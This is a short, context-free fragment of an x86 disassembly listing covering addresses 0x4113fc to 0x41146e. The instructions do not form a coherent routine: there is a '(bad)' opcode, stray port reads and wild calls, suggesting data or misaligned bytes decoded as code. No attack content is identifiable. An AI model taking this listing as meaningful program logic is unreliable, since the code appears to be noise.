  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
